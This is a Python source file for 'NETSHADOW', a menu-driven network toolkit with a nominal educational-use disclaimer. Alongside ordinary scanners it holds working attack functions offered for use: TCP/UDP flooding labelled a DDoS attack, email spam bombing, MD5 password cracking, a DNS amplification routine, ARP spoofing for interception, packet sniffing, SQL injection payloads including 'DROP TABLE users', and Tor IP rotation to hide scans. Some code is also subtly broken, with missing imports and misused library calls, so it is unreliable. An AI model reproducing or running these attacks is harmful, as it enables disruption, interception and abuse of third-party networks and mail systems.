"""
============================================================
  PROJE: [NETSHADOW V.2.0.1]
  GELİŞTİRİCİ:  s3loc
============================================================

TÜRKÇE - Sorumluluk Reddi ve Kullanım Koşulları:
------------------------------------------------------------
Bu proje yalnızca eğitim ve araştırma amaçlı olarak geliştirilmiştir.
Hiçbir şekilde kötüye kullanım, yasa dışı faaliyetler veya üçüncü
taraflara zarar verme amacıyla kullanılmamalıdır.

Geliştirici, bu yazılımın kötüye kullanımı sonucu doğabilecek yasal
veya etik ihlallerden sorumlu tutulamaz. Yazılım "olduğu gibi" sunulmuştur
ve herhangi bir garanti verilmemektedir. Kullanım tamamen kullanıcı
sorumluluğundadır.

Ticari kullanım, dağıtım veya değiştirme durumlarında geliştiriciden
yazılı izin alınması zorunludur.

ENGLISH - Disclaimer and Terms of Use:
------------------------------------------------------------
This project is developed strictly for educational and research purposes.
It must not be used for malicious activities, illegal operations, or
to harm others in any way.

The developer is not liable for any legal or ethical consequences resulting
from the misuse of this software. The software is provided "as is", without
any warranties. Use is entirely at the user's own risk.

Commercial use, distribution, or modification requires prior written
permission from the developer.
============================================================

░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░⬛⬛⬛⬛⬛⬛░
░░░░░░░░░░⬛⬜⬜⬜⬜⬛░░░
░░░░░░░░⬛⬜⬜⬜⬜⬜⬛░░
░░░░░░░░⬛⬜⬛⬜⬛⬜⬜⬛░
░░░░░░░░⬛⬜⬜⬜⬜⬜⬜⬛░░░░░░
░░⬛⬛⬛⬜⬜⬛⬛⬛⬜⬜⬜⬛⬛⬛░░
░░⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛░░
░░░░⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛░░
░░░░░░⬛⬜⬜⬜⬜⬜⬜⬜⬜⬛░░
░░░░░░⬛⬜⬜⬜⬜⬜⬜⬜⬛░░░
░░░░░░⬛⬜⬜⬜⬜⬜⬜⬜⬛░
░░░░░░░░⬛⬜⬜⬜⬜⬜⬜⬛░
░░░░░░░░░░⬛⬜⬜⬜⬜⬛░░░
░░░░░░░░░░░░⬛⬛⬜⬜⬛░░░
░░░░░░░░░░░░░░░░⬛⬛⬛⬛░
░░░░░░░░░░░░░░░░░░░░░░░░░





"""












from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from smtplib import SMTP

import dns.resolver
import nmap
import psutil
import requests
from Crypto.Cipher import AES
from geopy.geocoders import Nominatim
from prettytable import PrettyTable
from pywifi import PyWiFi, const
from scapy.all import *
from scapy.layers import bluetooth, dns
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from stem import Signal
from stem.control import Controller


# -----------------------------------------------------------------------------------------------------------------------------------------------------------
from dataclasses import dataclass, field
from typing import List

@dataclass
class Config:
    TOR_PASSWORD: str = "your_tor_password"
    TOR_CONTROL_PORT: int = 9051
    TOR_PROXY: str = "127.0.0.1:9050"
    SMTP_SERVER: str = "smtp.gmail.com"
    SMTP_PORT: int = 587
    EMAIL_FROM: str = "your_email@gmail.com"
    EMAIL_PASSWORD: str = "your_email_password"
    AES_KEY: str = "supersecretkey1234567890"  # 16/24/32 bytes long
    WORDLIST_PATH: str = "wordlist.txt"
    MAX_THREADS: int = 100
    VPN_PORTS: List[int] = field(default_factory=lambda: [1194, 1723, 1701, 500, 4500])


# -----------------------------------------------------------------------------------------------------------------------------------------------------------
# ASCII Art and Display Functions
def exit_ascii():
    exit_message = r"""
……………W$ХН~Н!Н!НХGFDSSFFFTTSDS.
………..*UHWHН!hhhhН!?M88WHXХWWWWSW$.
…….X*#M@$Н!eeeeНXНM$$$$$$WWxХWWWSW$
……ХН!Н!Н!?HН..ХН$Н$$$$$$$$$$8XХDDFDFWW$
….Н!f$$$$gХhН!jkgfХ~Н$Н#$$$$$$$$$$8XХKKWW$,
….ХНgХ:НHНHHHfg~iU$XН?R$$$$$$RMMНLFG$$$$
….~НgН!Н!df$$$$$JXW$$$UН!?$$$$$$RMMН$$$$$$
……НХdfgdfghtХНM”T#$$$$WX??#MRRMMMН$$$$$$
……~?W…fiW*`……..`”#$$$$8НJQ!Н!?WWW?Н!J$$$$
………..M$$$$…….`”T#$T~Н8$8$WUWUXUQ$$$$
………..~#$$$mХ………….~Н~$$$?$$AS$$$$$F$
…………..~T$$$$8xx……xWWFW~##*””””””II$
……………$$$.P$T#$$@SDJW@*/**$$….,,$,
………….$$$L!?$$.XXХXUW…../…..$$,,,,…,,ХJ'
………….$$$H.Нu….””$$B$$MEb!MХUНT$$
…………..?$$$B $ $Wu,,”***PF~***$/
………………..L$$$$B$$eeeХWP$$/
…………………..”##*$$$$M$$F”
    """
    print(exit_message)


def display_menu():
    menu_ascii = r"""
 ▂▃▄▅▆▇█▓▒░S3LOC_ULTIMATE░▒▓█▇▆▅▄▃▂
    """
    print(menu_ascii)
    print("\n")

    table = PrettyTable()
    # Benzersiz alan adları kullanıyoruz
    table.field_names = ["Option", "Description", "Option2", "Description2"]
    table.align = "l"

    # Network Tools
    table.add_row(["1", "📶 Scan WiFi Networks", "2", "🖥️ List Network Interfaces"])
    table.add_row(["3", "🛡️ Port Scan", "4", "🌐 List Network IPs"])
    table.add_row(["5", "📍 Get Location from IP", "6", "🌐 Check Network Bandwidth"])

    # Security Scans
    table.add_row(["7", "🔍 Vulnerability Scan", "8", "🌐 List VPN Connections"])
    table.add_row(["9", "🔍 SQL Injection Scan", "10", "🔍 Bluetooth Security Scan"])
    table.add_row(["11", "🌐 Ping Devices on Network", "12", "🌐 Discover Shared Files"])

    # Advanced Attacks
    table.add_row(["13", "⚠️ Start DDoS Attack", "14", "📧 Send Email Spam"])
    table.add_row(["15", "🔓 Password Cracker", "16", "🌐 DNS Amplification Attack"])
    table.add_row(["17", "🌐 ARP Spoofing", "18", "🌐 Packet Sniffer"])

    # Utilities
    table.add_row(["19", "📊 Data Analyzer", "20", "🔍 DNS Lookup"])
    table.add_row(["21", "👁️‍🗨️ Monitor Network Traffic", "22", "🔒 Encrypt/Decrypt Data"])

    # Exit
    table.add_row(["0", "🚪 Exit", "100", "❓ How to Use?"])

    print(table)


def welcome_ascii():
    welcome_message = r"""
    Yb        dP 888888 88      dP""b8  dP"Yb  8b    d8 888888
     Yb  db  dP  88__   88     dP   `" dP   Yb 88b  d88 88__
      YbdPYbdP   88""   88  .o Yb      Yb   dP 88YbdP88 88""
       YP  YP    888888 88ood8  YboodP  YbodP  88 YY 88 888888
    """
    print(welcome_message)


# -----------------------------------------------------------------------------------------------------------------------------------------------------------
# Core Functions

def scan_wifi_networks():
    """Enhanced WiFi scanning with signal strength and encryption info"""
    try:
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(5)  # Longer scan time for better results
        networks = iface.scan_results()

        table = PrettyTable()
        table.field_names = ["SSID", "Signal", "BSSID", "Encryption"]

        for network in networks:
            enc = ""
            if network.akm:
                enc = "WPA2" if const.AKM_TYPE_WPA2PSK in network.akm else "WPA"
            table.add_row([network.ssid, f"{network.signal}dBm", network.bssid, enc])

        print(table)
        return networks
    except Exception as e:
        logging.error(f"WiFi scan error: {e}")
        return []


def list_network_interfaces():
    """Detailed network interface listing with IPs and status"""
    interfaces = psutil.net_if_addrs()
    stats = psutil.net_if_stats()

    table = PrettyTable()
    table.field_names = ["Interface", "IP Address", "Netmask", "MAC", "Status"]

    for name, addrs in interfaces.items():
        ipv4 = mac = ""
        for addr in addrs:
            if addr.family == socket.AF_INET:
                ipv4 = f"{addr.address}/{addr.netmask}"
            elif addr.family == socket.AF_PACKET:
                mac = addr.address

        status = "UP" if stats[name].isup else "DOWN"
        table.add_row([name, ipv4, mac, status])

    print(table)


def stealth_port_scan(target_ip: str, config: Config):
    """Advanced stealth port scanning with Tor and service detection"""
    try:
        renew_tor_ip(config)
        nm = nmap.PortScanner()

        # Using nmap with stealth options (-sS) and service detection (-sV)
        nm.scan(target_ip, arguments='-sS -sV -T4 -Pn --open')

        table = PrettyTable()
        table.field_names = ["Port", "State", "Service", "Version"]

        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in sorted(ports):
                    service = nm[host][proto][port]
                    table.add_row([
                        f"{proto}/{port}",
                        service['state'],
                        service['name'],
                        service.get('product', '') + " " + service.get('version', '')
                    ])

        print(table)
        return nm
    except Exception as e:
        logging.error(f"Port scan error: {e}")
        return None


def scan_network():
    """Network device discovery with OS detection"""
    try:
        # ARP scan to find active devices
        arp = ARP(pdst="192.168.1.1/24")
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]

        devices = []
        table = PrettyTable()
        table.field_names = ["IP Address", "MAC Address", "Vendor"]

        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
            vendor = get_mac_vendor(received.hwsrc)
            table.add_row([received.psrc, received.hwsrc, vendor])

        print(table)
        return devices
    except Exception as e:
        logging.error(f"Network scan error: {e}")
        return []


def get_mac_vendor(mac: str) -> str:
    """Look up vendor from MAC address"""
    try:
        url = f"https://api.macvendors.com/{mac}"
        response = requests.get(url)
        return response.text if response.status_code == 200 else "Unknown"
    except:
        return "Unknown"


def get_location_from_ip(ip: str):
    """Enhanced IP geolocation with multiple sources"""
    try:
        # First try with ip-api
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return f"{data['city']}, {data['regionName']}, {data['country']} ({data['isp']})"

        # Fallback to geopy
        geolocator = Nominatim(user_agent="geoapiExercises")
        location = geolocator.geocode(ip)
        return location.address if location else "Location not found"
    except Exception as e:
        logging.error(f"Location lookup error: {e}")
        return "Location service unavailable"


def check_network_bandwidth(interval: int = 1):
    """Real-time bandwidth monitoring"""
    try:
        print("Monitoring network bandwidth (press Ctrl+C to stop)...")
        old_value = psutil.net_io_counters()

        while True:
            new_value = psutil.net_io_counters()

            # Calculate differences
            sent = (new_value.bytes_sent - old_value.bytes_sent) / 1024
            recv = (new_value.bytes_recv - old_value.bytes_recv) / 1024

            print(f"Upload: {sent:.2f} KB/s | Download: {recv:.2f} KB/s", end='\r')
            old_value = new_value
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\nMonitoring stopped.")


def scan_vulnerabilities(target_ip: str):
    """Comprehensive vulnerability scanning with Nmap NSE"""
    try:
        nm = nmap.PortScanner()
        print("Starting vulnerability scan (this may take several minutes)...")

        # Using common vulnerability scripts
        nm.scan(target_ip, arguments='-sV --script=vulners,vuln')

        table = PrettyTable()
        table.field_names = ["Port", "Vulnerability", "Description"]

        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    script = nm[host][proto][port].get('script', {})
                    for vuln, desc in script.items():
                        table.add_row([port, vuln, desc])

        print(table)
        return nm
    except Exception as e:
        logging.error(f"Vulnerability scan error: {e}")
        return None


def list_vpn_connections(config: Config):
    """Detect VPN connections including common VPN ports"""
    try:
        connections = psutil.net_connections()
        vpn_conns = []

        table = PrettyTable()
        table.field_names = ["Protocol", "Local IP", "Remote IP", "Status"]

        for conn in connections:
            if conn.status == 'ESTABLISHED' and conn.laddr.port in config.VPN_PORTS:
                vpn_conns.append(conn)
                table.add_row([
                    "TCP" if conn.type == socket.SOCK_STREAM else "UDP",
                    f"{conn.laddr.ip}:{conn.laddr.port}",
                    f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                    conn.status
                ])

        print(table)
        return vpn_conns
    except Exception as e:
        logging.error(f"VPN detection error: {e}")
        return []


def sql_injection_scan(url: str):
    """Advanced SQL injection scanner with multiple techniques"""
    try:
        payloads = [
            "'", "\"", "1=1", "1=0",
            "' OR '1'='1", "' OR 1=1--",
            "' UNION SELECT null,username,password FROM users--",
            "'; DROP TABLE users--"
        ]

        table = PrettyTable()
        table.field_names = ["Payload", "Status", "Response Code"]

        for payload in payloads:
            test_url = f"{url}{payload}" if "?" in url else f"{url}?id={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                vuln = "VULNERABLE" if any(
                    error in response.text.lower() for error in ["sql", "syntax", "mysql"]) else "SAFE"
                table.add_row([payload, vuln, response.status_code])
            except Exception as e:
                table.add_row([payload, "ERROR", str(e)])

        print(table)
        return table
    except Exception as e:
        logging.error(f"SQL injection scan error: {e}")
        return None


def detailed_bluetooth_scan():
    """Comprehensive Bluetooth device discovery with services"""
    try:
        print("Scanning for Bluetooth devices (this may take 10-15 seconds)...")
        devices = bluetooth.discover_devices(duration=10, lookup_names=True, lookup_class=True, flush_cache=True)

        table = PrettyTable()
        table.field_names = ["Name", "MAC Address", "Device Class", "Services"]

        for addr, name, device_class in devices:
            services = bluetooth.find_service(address=addr)
            service_list = ", ".join([s['name'] for s in services]) if services else "None"
            table.add_row([name, addr, device_class, service_list])

        print(table)
        return devices
    except Exception as e:
        logging.error(f"Bluetooth scan error: {e}")
        return []


def ping_devices_in_network(ip_range: str):
    """Parallel ping sweep for network discovery"""
    try:
        base_ip = ".".join(ip_range.split(".")[:3])
        start, end = map(int, ip_range.split(".")[3].split("-"))

        table = PrettyTable()
        table.field_names = ["IP Address", "Status", "Response Time"]

        def ping(ip):
            try:
                cmd = ["ping", "-c", "1", "-W", "1", ip]
                output = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
                time_ms = float(output.decode().split("time=")[1].split(" ")[0])
                return ip, "ALIVE", f"{time_ms}ms"
            except:
                return ip, "DEAD", "N/A"

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(ping, f"{base_ip}.{i}") for i in range(start, end + 1)]
            for future in as_completed(futures):
                table.add_row(future.result())

        print(table)
    except Exception as e:
        logging.error(f"Ping sweep error: {e}")


def discover_shared_files(ip: str):
    """Network share enumeration with SMB and NFS detection"""
    try:
        print(f"Scanning for shared files on {ip}...")

        # Check SMB shares
        smb_shares = []
        try:
            smb_shares = os.listdir(f"\\\\{ip}\\")
        except Exception as e:
            pass

        # Check NFS mounts (Linux)
        nfs_shares = []
        try:
            nfs_shares = os.listdir(f"/mnt/{ip}")
        except:
            pass

        table = PrettyTable()
        table.field_names = ["Share Type", "Share Name"]

        for share in smb_shares:
            table.add_row(["SMB", share])

        for share in nfs_shares:
            table.add_row(["NFS", share])

        print(table)
        return {"smb": smb_shares, "nfs": nfs_shares}
    except Exception as e:
        logging.error(f"Share discovery error: {e}")
        return {}


def start_ddos_attack(target_ip: str, port: int, config: Config):
    """Advanced DDoS attack with multiple attack vectors"""
    try:
        print(f"Starting DDoS attack on {target_ip}:{port} (press Ctrl+C to stop)...")

        def tcp_flood():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, port))
                    s.sendto(("GET / HTTP/1.1\r\n").encode(), (target_ip, port))
                    s.close()
                except:
                    pass

        def udp_flood():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(random._urandom(1024), (target_ip, port))
                    s.close()
                except:
                    pass

        # Start multiple attack threads
        for _ in range(config.MAX_THREADS // 2):
            threading.Thread(target=tcp_flood, daemon=True).start()
            threading.Thread(target=udp_flood, daemon=True).start()

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nAttack stopped.")


def send_email_spam(config: Config, recipient: str, count: int = 10):
    """Advanced email spam with HTML content and attachments"""
    try:
        msg = MIMEMultipart()
        msg['From'] = config.EMAIL_FROM
        msg['To'] = recipient
        msg['Subject'] = "Important Notification"

        # HTML content
        html = """<html><body>
        <h1>Important Message</h1>
        <p>This is an automated message sent to multiple recipients.</p>
        </body></html>"""
        msg.attach(MIMEText(html, 'html'))

        # Add attachment
        with open("attachment.txt", "w") as f:
            f.write("Sample attachment content")
        attachment = MIMEText(open("attachment.txt").read())
        attachment.add_header('Content-Disposition', 'attachment', filename="attachment.txt")
        msg.attach(attachment)

        # Send emails
        server = SMTP(config.SMTP_SERVER, config.SMTP_PORT)
        server.starttls()
        server.login(config.EMAIL_FROM, config.EMAIL_PASSWORD)

        for i in range(1, count + 1):
            server.sendmail(config.EMAIL_FROM, recipient, msg.as_string())
            print(f"Sent email {i}/{count}", end='\r')
            time.sleep(0.5)  # Avoid rate limiting

        server.quit()
        print(f"\nSuccessfully sent {count} emails to {recipient}")
    except Exception as e:
        logging.error(f"Email spam error: {e}")


def crack_password(target_hash: str, config: Config):
    """Advanced password cracking with multiple attack modes"""
    try:
        print(f"Cracking hash: {target_hash}")

        def dictionary_attack():
            if not os.path.exists(config.WORDLIST_PATH):
                return None

            with open(config.WORDLIST_PATH, "r", errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if hashlib.md5(password.encode()).hexdigest() == target_hash:
                        return password
            return None

        def brute_force(max_length=4):
            chars = string.ascii_letters + string.digits + string.punctuation
            for length in range(1, max_length + 1):
                for attempt in itertools.product(chars, repeat=length):
                    password = ''.join(attempt)
                    if hashlib.md5(password.encode()).hexdigest() == target_hash:
                        return password
            return None

        # Try dictionary attack first
        print("Trying dictionary attack...")
        password = dictionary_attack()

        # Fallback to brute force if dictionary fails
        if not password:
            print("Dictionary failed, trying brute force...")
            password = brute_force()

        if password:
            print(f"\n[+] Password found: {password}")
            return password
        else:
            print("\n[-] Password not found")
            return None
    except Exception as e:
        logging.error(f"Password cracking error: {e}")
        return None


def dns_amplification_attack(target: str, config: Config):
    """DNS amplification attack using open resolvers"""
    try:
        print(f"Starting DNS amplification attack on {target} (press Ctrl+C to stop)...")

        # List of DNS query types that generate large responses
        query_types = ['ANY', 'AXFR', 'TXT']
        domains = [
            'isc.org', 'ripe.net', 'google.com',
            'cloudflare.com', 'facebook.com'
        ]

        # Open DNS resolvers (should be replaced with actual list)
        resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']

        def attack():
            while True:
                try:
                    resolver = random.choice(resolvers)
                    qtype = random.choice(query_types)
                    domain = random.choice(domains)

                    # Create DNS query
                    dns_query = IP(dst=resolver) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype))
                    send(dns_query, verbose=0)
                except:
                    pass

        # Start attack threads
        for _ in range(config.MAX_THREADS):
            threading.Thread(target=attack, daemon=True).start()

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nAttack stopped.")


def arp_spoof(target_ip: str, gateway_ip: str, config: Config):
    """Advanced ARP spoofing with packet forwarding"""
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            print("Could not resolve MAC addresses")
            return

        print(f"Starting ARP spoofing {target_ip} -> {gateway_ip} (press Ctrl+C to stop)...")

        # Enable IP forwarding (Linux)
        if os.name == 'posix':
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        def spoof():
            while True:
                try:
                    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
                    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
                    time.sleep(1)
                except:
                    pass

        # Start spoofing thread
        threading.Thread(target=spoof, daemon=True).start()

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")
        if os.name == 'posix':
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def get_mac(ip: str) -> Optional[str]:
    """Get MAC address for given IP"""
    try:
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)[0]
        return ans[0][1].hwsrc
    except:
        return None


def packet_sniffer(interface: str = None, count: int = 100):
    """Advanced packet sniffer with protocol analysis"""
    try:
        print(f"Starting packet capture (press Ctrl+C to stop after {count} packets)...")

        def packet_callback(packet):
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                proto = packet[IP].proto

                protocol = {
                    1: "ICMP",
                    6: "TCP",
                    17: "UDP",
                }.get(proto, str(proto))

                info = ""
                if TCP in packet:
                    info = f"{packet[TCP].sport}->{packet[TCP].dport} [{packet[TCP].flags}]"
                elif UDP in packet:
                    info = f"{packet[UDP].sport}->{packet[UDP].dport}"

                print(f"[{protocol}] {src_ip} -> {dst_ip} {info}")

        sniff(iface=interface, prn=packet_callback, count=count)
    except Exception as e:
        logging.error(f"Packet sniffing error: {e}")


def data_analyzer():
    """Comprehensive network data analysis"""
    try:
        print("Network Data Analysis:")

        # Network interfaces
        print("\n=== Network Interfaces ===")
        list_network_interfaces()

        # Connections
        print("\n=== Active Connections ===")
        connections = psutil.net_connections()

        table = PrettyTable()
        table.field_names = ["Protocol", "Local", "Remote", "Status"]

        for conn in connections[:20]:  # Show first 20
            table.add_row([
                "TCP" if conn.type == socket.SOCK_STREAM else "UDP",
                f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
                f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                conn.status
            ])

        print(table)

        # Bandwidth
        print("\n=== Bandwidth Usage ===")
        io = psutil.net_io_counters()
        print(f"Bytes Sent: {io.bytes_sent / 1024 / 1024:.2f} MB")
        print(f"Bytes Received: {io.bytes_recv / 1024 / 1024:.2f} MB")

    except Exception as e:
        logging.error(f"Data analysis error: {e}")


def dns_lookup(domain: str):
    """Comprehensive DNS lookup with multiple record types"""
    try:
        print(f"DNS records for {domain}:")

        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']

        table = PrettyTable()
        table.field_names = ["Type", "Record"]

        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for rdata in answers:
                    table.add_row([rtype, rdata.to_text()])
            except:
                pass

        print(table)
    except Exception as e:
        logging.error(f"DNS lookup error: {e}")


def monitor_network_traffic(interval: int = 5):
    """Continuous network traffic monitoring"""
    try:
        print("Monitoring network traffic (press Ctrl+C to stop)...")

        old_io = psutil.net_io_counters()

        while True:
            new_io = psutil.net_io_counters()

            # Calculate differences
            sent = (new_io.bytes_sent - old_io.bytes_sent) / 1024
            recv = (new_io.bytes_recv - old_io.bytes_recv) / 1024

            # Get active connections
            connections = psutil.net_connections()
            est = sum(1 for c in connections if c.status == 'ESTABLISHED')

            print(f"↑ {sent:.2f} KB/s | ↓ {recv:.2f} KB/s | Active: {est} conns", end='\r')

            old_io = new_io
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\nMonitoring stopped.")


def encrypt_data(data: str, config: Config) -> str:
    """AES encryption with GCM mode"""
    try:
        cipher = AES.new(config.AES_KEY.encode(), AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        encrypted = cipher.nonce + tag + ciphertext
        return base64.b64encode(encrypted).decode()
    except Exception as e:
        logging.error(f"Encryption error: {e}")
        return ""


def decrypt_data(encrypted_data: str, config: Config) -> str:
    """AES decryption with GCM mode"""
    try:
        data = base64.b64decode(encrypted_data)
        nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
        cipher = AES.new(config.AES_KEY.encode(), AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()
    except Exception as e:
        logging.error(f"Decryption error: {e}")
        return ""


def renew_tor_ip(config: Config) -> bool:
    """Renew Tor circuit for new IP"""
    try:
        with Controller.from_port(port=config.TOR_CONTROL_PORT) as controller:
            controller.authenticate(password=config.TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
        time.sleep(5)  # Wait for new circuit
        return True
    except Exception as e:
        logging.error(f"Tor IP renewal error: {e}")
        return False


# -----------------------------------------------------------------------------------------------------------------------------------------------------------
# Main Program
def main():
    config = Config()
    welcome_ascii()

    # Create wordlist if not exists
    if not os.path.exists(config.WORDLIST_PATH):
        with open(config.WORDLIST_PATH, "w") as f:
            f.write("password\nadmin\n123456\nletmein\nqwerty\n")

    while True:
        display_menu()
        choice = input("Select an option (0-22, 100): ")

        try:
            if choice == '1':
                scan_wifi_networks()
            elif choice == '2':
                list_network_interfaces()
            elif choice == '3':
                target = input("Target IP: ")
                stealth_port_scan(target, config)
            elif choice == '4':
                scan_network()
            elif choice == '5':
                ip = input("IP address: ")
                print("Location:", get_location_from_ip(ip))
            elif choice == '6':
                check_network_bandwidth()
            elif choice == '7':
                target = input("Target IP: ")
                scan_vulnerabilities(target)
            elif choice == '8':
                list_vpn_connections(config)
            elif choice == '9':
                url = input("URL to scan (include http://): ")
                sql_injection_scan(url)
            elif choice == '10':
                detailed_bluetooth_scan()
            elif choice == '11':
                ip_range = input("IP range (e.g., 192.168.1.1-254): ")
                ping_devices_in_network(ip_range)
            elif choice == '12':
                ip = input("Target IP: ")
                discover_shared_files(ip)
            elif choice == '13':
                target = input("Target IP: ")
                port = int(input("Target port: "))
                start_ddos_attack(target, port, config)
            elif choice == '14':
                recipient = input("Recipient email: ")
                count = int(input("Number of emails: "))
                send_email_spam(config, recipient, count)
            elif choice == '15':
                target_hash = input("MD5 hash to crack: ")
                crack_password(target_hash, config)
            elif choice == '16':
                target = input("Target IP: ")
                dns_amplification_attack(target, config)
            elif choice == '17':
                target = input("Target IP: ")
                gateway = input("Gateway IP: ")
                arp_spoof(target, gateway, config)
            elif choice == '18':
                interface = input("Interface (leave blank for default): ") or None
                packet_sniffer(interface)
            elif choice == '19':
                data_analyzer()
            elif choice == '20':
                domain = input("Domain: ")
                dns_lookup(domain)
            elif choice == '21':
                monitor_network_traffic()
            elif choice == '22':
                action = input("Encrypt or Decrypt? (e/d): ")
                if action.lower() == 'e':
                    data = input("Data to encrypt: ")
                    print("Encrypted:", encrypt_data(data, config))
                else:
                    data = input("Data to decrypt: ")
                    print("Decrypted:", decrypt_data(data, config))
            elif choice == '0':
                exit_ascii()
                break
            elif choice == '100':
                print("""
                HOW TO USE:
                1. Select an option from the menu
                2. Follow the prompts
                3. Use Ctrl+C to stop ongoing operations

                NOTE: Some features require root/admin privileges
                """)
            else:
                print("Invalid option")
        except KeyboardInterrupt:
            print("\nOperation cancelled")
        except Exception as e:
            logging.error(f"Error: {e}")
            print(f"An error occurred: {e}")

        input("\nPress Enter to continue...")


if __name__ == "__main__":
    main()